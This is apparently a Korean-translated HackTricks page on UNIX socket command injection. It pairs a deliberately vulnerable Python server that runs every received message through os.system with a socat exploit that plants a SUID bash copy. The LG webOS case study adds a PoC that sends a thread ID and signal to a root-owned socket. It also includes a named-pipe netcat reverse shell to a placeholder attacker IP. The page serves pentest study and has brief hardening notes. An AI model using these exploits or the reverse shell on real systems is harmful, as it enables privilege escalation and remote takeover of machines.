# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Python을 사용한 Socket binding 예제

다음 예제에서는 **unix socket이 생성됩니다** (`/tmp/socket_test.s`) 그리고 수신되는 모든 내용이 `os.system`에 의해 **실행**됩니다. 실제로 이런 코드를 현장에서 보게 되지는 않을 것이지만, 이 예제의 목적은 unix sockets를 사용하는 코드가 어떻게 보이는지와 최악의 경우 입력을 어떻게 처리해야 하는지를 살펴보는 것입니다.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
코드를 **실행**하려면 python을 사용하여: `python s.py` 그리고 **socket이 어떻게 listening하는지 확인하세요**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## 사례 연구: Root-owned UNIX socket signal-triggered escalation (LG webOS)

권한 있는 일부 데몬은 신뢰할 수 없는 입력을 받는 root-owned UNIX socket을 노출하고, 권한이 필요한 동작을 thread-IDs와 signals에 연결합니다. 프로토콜이 비권한 클라이언트가 어느 native thread를 타깃으로 하는지 영향을 줄 수 있게 허용하면, 권한 있는 코드 경로를 유발하여 권한 상승을 시도할 수 있습니다.

Observed pattern:
- root-owned socket에 연결합니다 (예: /tmp/remotelogger).
- 스레드를 생성하고 native thread id (TID)를 얻습니다.
- TID(패킹된 값)와 패딩을 함께 요청으로 전송하고, 확인 응답(acknowledgement)을 받습니다.
- 해당 TID에 특정 signal을 전달해 권한 있는 동작을 트리거합니다.

간단한 PoC 스케치:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
이를 root shell로 전환하려면, 간단한 named-pipe + nc 패턴을 사용할 수 있습니다:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
노트:
- 이 유형의 취약점은 비특권 클라이언트 상태(TIDs)에서 유래한 값을 신뢰하고 이를 특권 신호 핸들러나 로직에 결합할 때 발생합니다.
- 소켓에 대한 자격증명을 강제하고, 메시지 형식을 검증하며, 특권 작업을 외부에서 제공된 스레드 식별자와 분리하여 강화하세요.

## 참고 자료

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
